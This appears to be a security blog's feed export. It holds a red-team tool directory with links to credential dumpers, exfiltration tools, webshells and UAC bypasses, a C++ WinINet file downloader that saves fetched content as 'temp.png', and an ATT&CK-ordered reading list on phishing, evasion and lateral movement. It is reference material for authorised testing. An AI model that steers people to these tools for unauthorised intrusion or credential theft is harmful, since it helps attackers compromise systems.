Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. https://github.com/samratashok/nishang Inveigh is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool. https://github.com/Kevin-Robertson/Inveigh PowerUpSQL a PowerShell Toolkit for Attacking SQL Server. https://github.com/NetSPI/PowerUpSQL MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). https://github.com/dafthack/MailSniper WMIOps is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment. Itâ€™s designed primarily for use on penetration tests or red team engagements. https://github.com/ChrisTruncer/WMIOps Mimikatz is an open-source utility that enables the viewing of credential information from the Windows lsass. https://github.com/gentilkiwi/mimikatz LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. https://github.com/AlessandroZ/LaZagne mimipenguin a tool to dump the login password from the current linux desktop user. Adapted from the idea behind the popular Windows tool mimikatz. https://github.com/huntergregal/mimipenguin PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. https://docs.microsoft.com/en-us/sysinternals/downloads/psexec KeeThief allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system. https://github.com/HarmJ0y/KeeThief PSAttack combines some of the best projects in the infosec powershell community into a self contained custom PowerShell console. https://github.com/jaredhaight/PSAttack Internal Monologue Attack Retrieving NTLM Hashes without Touching LSASS. https://github.com/eladshamir/Internal-Monologue Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (for instance NMB, SMB1-3 and MS-DCERPC) the protocol implementation itself. https://github.com/CoreSecurity/impacket icebreaker gets plaintext Active Directory credentials if youâ€™re on the internal network but outside the AD environment. https://github.com/DanMcInerney/icebreaker Living Off The Land Binaries and Scripts (and now also Libraries) The goal of these lists are to document every binary, script and library that can be used for other purposes than they are designed to. https://github.com/api0cradle/LOLBAS WSUSpendu for compromised WSUS server to extend the compromise to clients. https://github.com/AlsidOfficial/WSUSpendu Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. https://github.com/infobyte/evilgrade NetRipper is a post exploitation tool targeting Windows systems which uses API hooking in order to intercept network traffic and encryption related functions from a low privileged user, being able to capture both plain-text traffic and encrypted traffic before encryption/after decryption. https://github.com/NytroRST/NetRipper LethalHTA Lateral Movement technique using DCOM and HTA. https://github.com/codewhitesec/LethalHTA Invoke-PowerThIEf an Internet Explorer Post Exploitation library. https://github.com/nettitude/Invoke-PowerThIEf RedSnarf is a pen-testing / red-teaming tool for Windows environments. https://github.com/nccgroup/redsnarf HoneypotBuster Microsoft PowerShell module designed for red teams that can be used to find honeypots and honeytokens in the network or at the host. https://github.com/JavelinNetworks/HoneypotBuster Establish Foothold Tunna is a set of tools which will wrap and tunnel any TCP communication over HTTP. It can be used to bypass network restrictions in fully firewalled environments. https://github.com/SECFORCE/Tunna reGeorg the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. https://github.com/sensepost/reGeorg Blade is a webshell connection tool based on console, currently under development and aims to be a choice of replacement of Chooper. https://github.com/wonderqs/Blade TinyShell Web Shell Framework. https://github.com/threatexpress/tinyshell PowerLurk is a PowerShell toolset for building malicious WMI Event Subsriptions. https://github.com/Sw4mpf0x/PowerLurk DAMP The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification.https://github.com/HarmJ0y/DAMP Escalate PrivilegesDomain Escalation PowerView is a PowerShell tool to gain network situational awareness on Windows domains. https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 Get-GPPPassword Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Invoke-ACLpwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured. https://github.com/fox-it/Invoke-ACLPwn BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. https://github.com/BloodHoundAD/BloodHound PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek Grouper a PowerShell script for helping to find vulnerable settings in AD Group Policy.https://github.com/l0ss/Grouper ADRecon is a tool which extracts various artifacts (as highlighted below) out of an AD environment in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis. https://github.com/sense-of-security/ADRecon ADACLScanner one script for ACLâ€™s in Active Directory. https://github.com/canix1/ADACLScanner LAPSToolkit a tool to audit and attack LAPS environments. https://github.com/leoloobeek/LAPSToolkit PingCastle is a free, Windows-based utility to audit the risk level of your AD infrastructure and check for vulnerable practices. https://www.pingcastle.com/download RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). https://github.com/cyberark/RiskySPN Mystique is a PowerShell tool to play with Kerberos S4U extensions, this module can assist blue teams to identify risky Kerberos delegation configurations as well as red teams to impersonate arbitrary users by leveraging KCD with Protocol Transition. https://github.com/machosec/Mystique Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpyâ€™s Kekeo project. https://github.com/GhostPack/Rubeus kekeo is a little toolbox I have started to manipulate Microsoft Kerberos in C (and for fun). https://github.com/gentilkiwi/kekeo Local Escalation UACMe is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. https://github.com/hfiref0x/UACME windows-kernel-exploits a collection windows kernel exploit. https://github.com/SecWiki/windows-kernel-exploits PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strikeâ€™s Beacon payload. https://github.com/rsmudge/ElevateKit Sherlock a powerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. https://github.com/rasta-mouse/Sherlock Tokenvator a tool to elevate privilege with Windows Tokens. https://github.com/0xbadjuju/Tokenvator Data Exfiltration CloakifyFactory &amp; the Cloakify Toolset - Data Exfiltration &amp; Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. https://github.com/TryCatchHCF/Cloakify DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. https://github.com/sensepost/DET DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. https://github.com/Arno0x/DNSExfiltrator PyExfil a Python Package for Data Exfiltration. https://github.com/ytisf/PyExfil Egress-Assess is a tool used to test egress data detection capabilities. https://github.com/ChrisTruncer/Egress-Assess Powershell RAT python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. https://github.com/Viralmaniar/Powershell-RAT MiscWireless Networks Wifiphisher is a security tool that performs Wi-Fi automatic association attacks to force wireless clients to unknowingly connect to an attacker-controlled Access Point. https://github.com/wifiphisher/wifiphisher Evilginx is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service. https://github.com/kgretzky/evilginx mana toolkit for wifi rogue AP attacks and MitM. https://github.com/sensepost/mana Embedded &amp; Peripheral Devices Hacking magspoof a portable device that can spoof/emulate any magnetic stripe, credit card or hotel card â€œwirelesslyâ€, even on standard magstripe (non-NFC/RFID) readers. https://github.com/samyk/magspoof WarBerryPi was built to be used as a hardware implant during red teaming scenarios where we want to obtain as much information as possible in a short period of time with being as stealth as possible. https://github.com/secgroundzero/warberry P4wnP1 is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor). https://github.com/mame82/P4wnP1 malusb HID spoofing multi-OS payload for Teensy. https://github.com/ebursztein/malusb Fenrir is a tool designed to be used â€œout-of-the-boxâ€ for penetration tests and offensive engagements. Its main feature and purpose is to bypass wired 802.1x protection and to give you an access to the target network. https://github.com/Orange-Cyberdefense/fenrir-ocd poisontap exploits locked/password protected computers over USB, drops persistent WebSocket-based backdoor, exposes internal router, and siphons cookies using Raspberry Pi Zero &amp; Node.js. https://github.com/samyk/poisontap WHID WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids.https://github.com/whid-injector/WHID Software For Team Communication RocketChat is free, unlimited and open source. Replace email &amp; Slack with the ultimate team chat software solution. https://rocket.chat Etherpad is an open source, web-based collaborative real-time editor, allowing authors to simultaneously edit a text document https://etherpad.net Log Aggregation RedELK Red Teamâ€™s SIEM - easy deployable tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations. https://github.com/outflanknl/RedELK/ CobaltSplunk Splunk Dashboard for CobaltStrike logs. https://github.com/vysec/CobaltSplunk Red Team Telemetry A collection of scripts and configurations to enable centralized logging of red team infrastructure. https://github.com/ztgrace/red_team_telemetry Elastic for Red Teaming Repository of resources for configuring a Red Team SIEM using Elastic. https://github.com/SecurityRiskAdvisors/RedTeamSIEM C# Offensive Framework SharpSploit is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers. https://github.com/cobbr/SharpSploit GhostPack is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- Seatbelt, SharpUp, SharpRoast, SharpDump, SafetyKatz, and SharpWMI. https://github.com/GhostPack SharpWeb .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge. https://github.com/djhohnstein/SharpWeb reconerator C# Targeted Attack Reconnissance Tools. https://github.com/stufus/reconerator SharpView C# implementation of harmj0yâ€™s PowerView. https://github.com/tevora-threat/SharpView Watson is a (.NET 2.0 compliant) C# implementation of Sherlock. https://github.com/rasta-mouse/Watson Labs Detection Lab This lab has been designed with defenders in mind. Its primary purpose is to allow the user to quickly build a Windows domain that comes pre-loaded with security tooling and some best practices when it comes to system logging configurations. https://github.com/clong/DetectionLab Modern Windows Attacks and Defense Lab This is the lab configuration for the Modern Windows Attacks and Defense class that Sean Metcalf (@pyrotek3) and I teach. https://github.com/jaredhaight/WindowsAttackAndDefenseLab Invoke-UserSimulator Simulates common user behaviour on local and remote Windows hosts. https://github.com/ubeeri/Invoke-UserSimulator Invoke-ADLabDeployer Automated deployment of Windows and Active Directory test lab networks. Useful for red and blue teams. https://github.com/outflanknl/Invoke-ADLabDeployer Sheepl Creating realistic user behaviour for supporting tradecraft development within lab environments. https://github.com/SpiderLabs/sheepl Scripts Aggressor Scripts is a scripting language for red team operations and adversary simulations inspired by scriptable IRC clients and bots. https://github.com/invokethreatguy/CSASC https://github.com/secgroundzero/CS-Aggressor-Scripts https://github.com/Und3rf10w/Aggressor-scripts https://github.com/harleyQu1nn/AggressorScripts https://github.com/rasta-mouse/Aggressor-Script https://github.com/RhinoSecurityLabs/Aggressor-Scripts https://github.com/bluscreenofjeff/AggressorScripts https://github.com/001SPARTaN/aggressor_scripts https://github.com/360-A-Team/CobaltStrike-Toolset A collection scripts useful for red teaming and pentesting https://github.com/FuzzySecurity/PowerShell-Suite https://github.com/nettitude/Powershell https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts https://github.com/threatexpress/red-team-scripts https://github.com/SadProcessor/SomeStuff https://github.com/rvrsh3ll/Misc-Powershell-Scripts https://github.com/enigma0x3/Misc-PowerShell-Stuff https://github.com/ChrisTruncer/PenTestScripts https://github.com/bluscreenofjeff/Scripts https://github.com/xorrior/RandomPS-Scripts https://github.com/xorrior/Random-CSharpTools https://github.com/leechristensen/Random https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering References MITREâ€™s ATT&amp;CKâ„¢ is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversaryâ€™s lifecycle and the platforms they are known to target. https://attack.mitre.org/wiki/Main_Page Cheat Sheets for various projects (Beacon/Cobalt Strike,PowerView, PowerUp, Empire, and PowerSploit). https://github.com/HarmJ0y/CheatSheets PRE-ATT&amp;CK Adversarial Tactics, Techniques &amp; Common Knowledge for Left-of-Exploit. https://attack.mitre.org/pre-attack/index.php/Main_Page Adversary OPSEC consists of the use of various technologies or 3rd party services to obfuscate, hide, or blend in with accepted network traffic or system behavior. https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC Adversary Emulation Plans To showcase the practical use of ATT&amp;CK for offensive operators and defenders, MITRE created Adversary Emulation Plans. https://attack.mitre.org/wiki/Adversary_Emulation_Plans Red-Team-Infrastructure-Wiki Wiki to collect Red Team infrastructure hardening resources. https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki Advanced Threat Tactics â€“ Course and Notes This is a course on red team operations and adversary simulations. https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes Red Team Tips as posted by @vysecurity on Twitter. https://vincentyiu.co.uk/red-team-tips Awesome Red Teaming List of Awesome Red Team / Red Teaming Resources. https://github.com/yeyintminthuhtut/Awesome-Red-Teaming ATT&amp;CK for Enterprise Software is a generic term for custom or commercial code, operating system utilities, open-source software, or other tools used to conduct behavior modeled in ATT&amp;CK. https://attack.mitre.org/wiki/Software Planning a Red Team exercise This document helps inform red team planning by contrasting against the very specific red team style described in Red Teams. https://github.com/magoo/redteam-plan Awesome Lockpicking a curated list of awesome guides, tools, and other resources related to the security and compromise of locks, safes, and keys. https://github.com/meitar/awesome-lockpicking Awesome Threat Intelligence a curated list of awesome Threat Intelligence resources. https://github.com/hslatman/awesome-threat-intelligence APT Notes Need some scenario? APTnotes is a repository of publicly-available papers and blogs (sorted by year) related to malicious campaigns/activity/software that have been associated with vendor-defined APT (Advanced Persistent Threat) groups and/or tool-sets. https://github.com/aptnotes/data TIBER-EU FRAMEWORK The European Framework for Threat Intelligence-based Ethical Red Teaming (TIBER-EU), which is the first Europe-wide framework for controlled and bespoke tests against cyber attacks in the financial market. http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf CBEST Implementation Guide CBEST is a framework to deliver controlled, bespoke, intelligence-led cyber security tests. The tests replicate behaviours of threat actors, assessed by the UK Government and commercial intelligence providers as posing a genuine threat to systemically important financial institutions.https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf Red Team: Adversarial Attack Simulation Exercise Guidelines for the Financial Industry in Singapore The Association of Banks in Singapore (ABS), with support from the Monetary Authority of Singapore (MAS), has developed a set of cybersecurity assessment guidelines today to strengthen the cyber resilience of the financial sector in Singapore. Known as the Adversarial Attack Simulation Exercises (AASE) Guidelines or â€œRed Teamingâ€ Guidelines, the Guidelines provide financial institutions (FIs) with best practices and guidance on planning and conducting Red Teaming exercises to enhance their security testing.https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf License]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wininet_downloader_cpp]]></title>
    <url>%2F2019%2F02%2F28%2Fwininet_downloader_cpp.html</url>
    <content type="text"><![CDATA[wininet.lib cpp ä¸‹è½½ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231#include &lt;windows.h&gt;#include &lt;wininet.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std; #pragma comment(lib, "wininet.lib") #define DOWNHELPER_AGENTNAME "downloader"#define LEN_OF_BUFFER_FOR_QUERYINFO 128#define DOWNLOAD_BUF_SIZE (10*1024) #define MAX_DOWNLOAD_REQUEST_TIME 10 #define MAX_DOWNLOAD_BYTESIZE (10000*1024*1024) BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes); BOOL DownloadUrl(std::string strUrl, std::string strFileName)&#123; BOOL bRet = FALSE; if (strUrl == "" || strFileName == "") return FALSE; HINTERNET hInet = NULL; HINTERNET hConnect = NULL; HINTERNET hRequestHead = NULL; HINTERNET hRequestGet = NULL; HANDLE hFileWrite = NULL; char* pBuf = NULL; DWORD dwRequestTryTimes = MAX_DOWNLOAD_REQUEST_TIME; DWORD dwDownBytes = 0; DWORD dwDownFileTotalBytes = 0; DWORD dwWriteBytes = 0; char bufQueryInfo[LEN_OF_BUFFER_FOR_QUERYINFO] = &#123;0&#125;; DWORD dwBufQueryInfoSize = sizeof(bufQueryInfo); DWORD dwStatusCode = 0; DWORD dwContentLen = 0; DWORD dwSizeDW = sizeof(DWORD); CHAR pszHostName[INTERNET_MAX_HOST_NAME_LENGTH] = &#123;0&#125;; CHAR pszUserName[INTERNET_MAX_USER_NAME_LENGTH] = &#123;0&#125;; CHAR pszPassword[INTERNET_MAX_PASSWORD_LENGTH] = &#123;0&#125;; CHAR pszURLPath[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; CHAR szURL[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; URL_COMPONENTSA urlComponents = &#123;0&#125;; urlComponents.dwStructSize = sizeof(URL_COMPONENTSA); urlComponents.lpszHostName = pszHostName; urlComponents.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH; urlComponents.lpszUserName = pszUserName; urlComponents.dwUserNameLength = INTERNET_MAX_USER_NAME_LENGTH; urlComponents.lpszPassword = pszPassword; urlComponents.dwPasswordLength = INTERNET_MAX_PASSWORD_LENGTH; urlComponents.lpszUrlPath = pszURLPath; urlComponents.dwUrlPathLength = INTERNET_MAX_URL_LENGTH; bRet = InternetCrackUrlA(strUrl.c_str(), 0, NULL, &amp;urlComponents); bRet = (bRet &amp;&amp; urlComponents.nScheme == INTERNET_SERVICE_HTTP); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hInet = InternetOpenA(DOWNHELPER_AGENTNAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL); if (!hInet) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; hConnect = InternetConnectA(hInet, pszHostName, urlComponents.nPort, pszUserName, pszPassword, INTERNET_SERVICE_HTTP, 0, NULL); if (!hConnect) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; if (urlComponents.dwUrlPathLength != 0) strcpy(szURL, urlComponents.lpszUrlPath); else strcpy(szURL, "/"); hRequestHead = HttpOpenRequestA(hConnect, "HEAD", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestHead, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; dwContentLen = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequestHead, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH, &amp;dwContentLen, &amp;dwSizeDW, NULL); if (bRet) &#123; if (dwContentLen &gt; MAX_DOWNLOAD_BYTESIZE) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; &#125; hRequestGet = HttpOpenRequestA(hConnect, "GET", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestGet, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hFileWrite = CreateFileA(strFileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hFileWrite) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; pBuf = new char[DOWNLOAD_BUF_SIZE]; if (!pBuf) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; dwDownFileTotalBytes = 0; while (1) &#123; dwDownBytes = 0; memset(pBuf, 0, DOWNLOAD_BUF_SIZE*sizeof(char)); bRet = InternetReadFile(hRequestGet, pBuf, DOWNLOAD_BUF_SIZE, &amp;dwDownBytes); if (bRet) &#123; if (dwDownBytes &gt; 0) &#123; dwDownFileTotalBytes += dwDownBytes; bRet = WriteFile(hFileWrite, pBuf, dwDownBytes, &amp;dwWriteBytes, NULL); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; &#125; else if (0 == dwDownBytes) &#123; bRet = TRUE; break; &#125; &#125; &#125; _END_OF_DOWNLOADURL: if (INVALID_HANDLE_VALUE != hFileWrite) CloseHandle(hFileWrite); if (pBuf) delete [] pBuf; if (hRequestGet) InternetCloseHandle(hRequestGet); if (hRequestHead) InternetCloseHandle(hRequestHead); if (hConnect) InternetCloseHandle(hConnect); if (hInet) InternetCloseHandle(hInet); return bRet;&#125; BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes)&#123; BOOL bRet = FALSE; DWORD dwStatusCode = 0; DWORD dwSizeDW = sizeof(DWORD); while (hRequest &amp;&amp; (nMaxTryTimes-- &gt; 0)) &#123; bRet = HttpSendRequestA(hRequest, NULL, 0, NULL, 0); if (!bRet) &#123; continue; &#125; else &#123; dwStatusCode = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &amp;dwStatusCode, &amp;dwSizeDW, NULL); if (bRet) &#123; if (HTTP_STATUS_OK == dwStatusCode) &#123; break; &#125; else &#123; bRet = FALSE; continue; &#125; &#125; &#125; &#125; return bRet;&#125; int main(int argc, char* argv[])&#123; cout&lt;&lt; "pls input downloadurl:"; char str[80]; cin.get(str,80); BOOL bR = DownloadUrl(str, "temp.png"); cout &lt;&lt; "Downloading..."&lt;&lt;endl; if (bR) cout &lt;&lt; "ok" &lt;&lt; endl; else cout &lt;&lt; "no" &lt;&lt; endl; return 0;&#125;]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Red Teaming Tools]]></title>
    <url>%2F2019%2F02%2F28%2FAwesome%20Red%20Teaming.html</url>
    <content type="text"><![CDATA[Awesome Red TeamingList of Awesome Red Team / Red Teaming Resources This list is for anyone wishing to learn about Red Teaming but do not have a starting point. Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on Mitre ATT&amp;CK You can help by sending Pull Requests to add more information. Table of Contents Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Exfiltration Command and Control Embedded and Peripheral Devices Hacking Misc RedTeam Gadgets Ebooks Training Certification â†‘ Initial Access How To: Empireâ€™s Cross Platform Office Macro Phishing with PowerPoint PHISHING WITH EMPIRE Bash Bunny OWASP Presentation of Social Engineering - OWASP USB Drop Attacks: The Danger of â€œLost And Foundâ€ Thumb Drives Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23 Cobalt Strike - Spear Phishing documentation Cobalt Strike Blog - Whatâ€™s the go-to phishing technique or exploit? Spear phishing with Cobalt Strike - Raphael Mudge EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE Phishing for access Excel macros with PowerShell PowerPoint and Custom Actions Macro-less Code Exec in MSWord Multi-Platform Macro Phishing Payloads Abusing Microsoft Word Features for Phishing: â€œsubDocâ€ Phishing Against Protected View POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS The PlugBot: Hardware Botnet Research Project Luckystrike: An Evil Office Document Generator The Absurdly Underestimated Dangers of CSV Injection Macroless DOC malware that avoids detection with Yara rule Phishing between the app whitelists Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2) Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2) Social Engineer Portal 7 Best social Engineering attack Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012 USING THE DDE ATTACK WITH POWERSHELL EMPIRE Phishing on Twitter - POT Microsoft Office â€“ NTLM Hashes via Frameset Defense-In-Depth write-up Spear Phishing 101 â†‘ Execution Research on CMSTP.exe, Windows oneliners to download remote payload and execute arbitrary code Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts WSH Injection: A Case Study Gscript Dropper â†‘ Persistence A View of Persistence hiding registry keys with psreflect Persistence using RunOnceEx â€“ Hidden from Autoruns.exe Persistence using GlobalFlags in Image File Execution Options â€“ Hidden from Autoruns.exe Putting data in Alternate data streams and how to execute it â€“ part 2 WMI Persistence with Cobalt Strike Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2) Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction â†‘ Privilege EscalationUser Account Control Bypass First entry: Welcome and fileless UAC bypass, Exploiting Environment Variables in Scheduled Tasks for UAC Bypass, Reading Your Way Around UAC in 3 parts: Part 1. Part 2. Part 3. Bypassing UAC using App Paths, â€œFilelessâ€ UAC Bypass using sdclt.exe, UAC Bypass or story about three escalations, â€œFilelessâ€ UAC Bypass Using eventvwr.exe and Registry Hijacking, Bypassing UAC on Windows 10 using Disk Cleanup, Using IARPUninstallStringLauncher COM interface to bypass UAC, Fileless UAC Bypass using sdclt Eventvwr File-less UAC Bypass CNA Windows 7 UAC whitelist Escalation Windows Privilege Escalation Checklist From Patch Tuesday to DA A Path for Privilege Escalation â†‘ Defense Evasion Window 10 Device Guard Bypass App Locker ByPass List Window Signed Binary Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files) Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations Empire without powershell Powershell without Powershell to bypass app whitelist MS Signed mimikatz in just 3 steps Hiding your process from sysinternals code signing certificate cloning attacks and defenses userland api monitoring and code injection detection In memory evasion Bypassing AMSI via COM Server Hijacking process doppelganging Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5 VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION Putting data in Alternate data streams and how to execute it AppLocker â€“ Case study â€“ How insecure is it really? â€“ Part 1 AppLocker â€“ Case study â€“ How insecure is it really? â€“ Part 2 Harden Windows with AppLocker â€“ based on Case study part 2 Harden Windows with AppLocker â€“ based on Case study part 2 Office 365 Safe links bypass Windows Defender Attack Surface Reduction Rules bypass Bypassing Device guard UMCI using CHM â€“ CVE-2017-8625 Bypassing Application Whitelisting with BGInfo Cloning and Hosting Evil Captive Portals using a Wifi PineApple https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/ Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts mavinject.exe Functionality Deconstructed â†‘ Credential Access Windows Access Tokens and Alternate credentials Bringing the hashes home with reGeorg &amp; Empire Intercepting passwords with Empire and winning Local Administrator Password Solution (LAPS) Part 1 Local Administrator Password Solution (LAPS) Part 2 USING A SCF FILE TO GATHER HASHES Remote Hash Extraction On Demand Via Host Security Descriptor Modification Offensive Encrypted Data Storage Practical guide to NTLM Relaying Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync Dumping Domain Password Hashes â†‘ Discovery Red Team Operating in a Modern Environment My First Go with BloodHound Introducing BloodHound A Red Teamerâ€™s Guide to GPOs and OUs Automated Derivative Administrator Search A Pentesterâ€™s Guide to Group Scoping Local Group Enumeration The PowerView PowerUsage Series #1 - Mass User Profile Enumeration The PowerView PowerUsage Series #2 â€“ Mapping Computer Shortnames With the Global Catalog The PowerView PowerUsage Series #3 â€“ Enumerating GPO edit rights in a foreign domain The PowerView PowerUsage Series #4 â€“ Finding cross-trust ACEs Aggressor PowerView Lay of the Land with BloodHound Scanning for Active Directory Privileges &amp; Privileged Accounts Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation SPN Discovery â†‘ Lateral Movement A Citrx Story Jumping Network Segregation with RDP Pass hash pass ticket no pain Abusing DNSAdmins privilege for escalation in Active Directory Using SQL Server for attacking a Forest Trust Extending BloodHound for Red Teamers OPSEC Considerations for beacon commands My First Go with BloodHound Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws Lateral movement using excel application and dcom Lay of the Land with BloodHound The Most Dangerous User Right You (Probably) Have Never Heard Of Agentless Post Exploitation A Guide to Attacking Domain Trusts Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy Targeted Kerberoasting Kerberoasting Without Mimikatz Abusing GPO Permissions Abusing Active Directory Permissions with PowerView Roasting AS-REPs Getting the goods with CrackMapExec: Part 1 Getting the goods with CrackMapExec: Part 2 DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement a guide to attacking domain trusts Outlook Home Page â€“ Another Ruler Vector Outlook Forms and Shells Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32 LethalHTA - A new lateral movement technique using DCOM and HTA Abusing DCOM For Yet Another Lateral Movement Technique â†‘ Collection Accessing clipboard from the lock screen in Windows 10 Part 1 Accessing clipboard from the lock screen in Windows 10 Part 2 â†‘ Exfiltration DNS Data exfiltration â€” What is this and How to use? DNS Tunnelling sg1: swiss army knife for data encryption, exfiltration &amp; covert communication Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator DET (extensible) Data Exfiltration Toolkit Data Exfiltration via Formula Injection Part1 â†‘ Command and ControlDomain Fronting Empre Domain Fronting Escape and Evasion 